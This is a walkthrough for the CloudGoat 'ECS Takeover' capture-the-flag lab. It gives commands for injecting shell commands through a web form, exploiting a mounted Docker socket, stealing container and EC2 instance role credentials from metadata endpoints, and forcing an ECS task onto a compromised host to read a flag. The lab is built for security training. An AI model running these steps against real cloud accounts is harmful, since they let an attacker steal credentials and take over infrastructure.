# ECS Takeover

Starting with access to the external website the attacker needs to find a remote code execution vulnerability. Through this the attacker can take advantage of resources available to the container hosting the website. The attacker discovers that the container has access to the host's metadata service and role credentials. They also discover the Docker socket mounted in the container giving full unauthenticated access to Docker on one host in the cluster. Abusing the mount misconfiguration, the attacker can enumerate other running containers on the instance and compromise the container role of a semi-privileged privd container. Using the privd role the attacker can enumerate the nodes and running tasks across the ECS cluster where another task "vault" is discovered to be running on a second node. With the host container privileges gained earlier, the attacker modifies the state of the cluster and forces ECS to reschedule the container to the compromised host. This allows the attacker to access the flag stored in the root of the "vault" container instance through docker.

Goal: Gain access to the "vault" container and retrieve the flag.

Fix: If there are issues such as "Your query returned no results. Please change your search criteria and try again." Use the following to find the ami for ecs optimized: 
``` aws ssm get-parameters --names /aws/service/ecs/optimized-ami/amazon-linux-2/recommended --region us-east-1 ```
# Walkthrough
## Gain access to website and perform remote code executions
```
In a web browser open: http://ec2-3-91-89-195.compute-1.amazonaws.com found in start.txt. Replace ec2-3-91-89-195.compute-1.amazonaws.com with the ALB endpoint.

Get all running containers
; docker ps
We see a container with privd e.g ecs_takeover_cgidnxmo9tdsp8-privd-1-privd-c4b3b9efc8f1c5f92d00 and id 515fd111ffb4

Get the access keys, secret keys and token of the privd container by querying metadata service in the URL field
; docker exec 515fd111ffb4 sh -c 'wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'

aws configure --profile ecs

We also need the host role
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ecs-takeover-ecs_takeover_cgidnxmo9tdsp8-ecs-agent

aws configure --profile host
```

## Use credentials and enumerate ECS cluster
```
aws configure --profile ecs

aws ecs list-clusters --profile ecs 
Get cluster arn arn:aws:ecs:us-east-1:<ACCOUNT ID>:cluster/ecs-takeover-ecs_takeover_cgidnxmo9tdsp8-cluster

For each task, find the one that is running valut
aws --profile ecs ecs describe-tasks --cluster <cluster arn> --tasks <task_arn>
aws --profile ecs ecs describe-services --cluster <cluster arn> --services <service name e.g. vault> 
This shows that the replica strategy is used which means that we can force it to run it on another container

```

## Drain the current task on vault so we can force it to run a container that we have control over
```
aws ecs list-container-instances --profile ecs --cluster arn:aws:ecs:us-east-1:<ACCOUNT ID>:cluster/ecs-takeover-ecs_takeover_cgidnxmo9tdsp8-cluster
Get the container instance of either


aws --profile ecs ecs update-container-instances-state --cluster ecs-takeover-ecs_takeover_cgidnxmo9tdsp8-cluster --container-instances ecs-takeover-ecs_takeover_cgidnxmo9tdsp8-cluster/b92e3ba48dee426eb0d56ef44f24878c --status DRAINING
```

## Get the final flag 
```
; docker exec <vault container id> ls
; docker exec <vault container id> cat FLAG.TXT
```
# References

https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/ecs_takeover/README.md